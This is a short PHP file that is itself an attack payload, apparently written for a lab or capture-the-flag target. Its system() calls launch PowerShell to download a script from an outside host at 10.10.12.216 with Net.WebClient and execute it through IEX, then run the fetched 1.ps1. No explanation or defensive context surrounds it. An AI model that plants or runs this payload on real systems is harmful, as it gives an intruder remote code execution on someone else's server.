<?php
echo system("powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.12.216:8000/1.ps1')");
echo system("powershell.exe 1.ps1");
?>

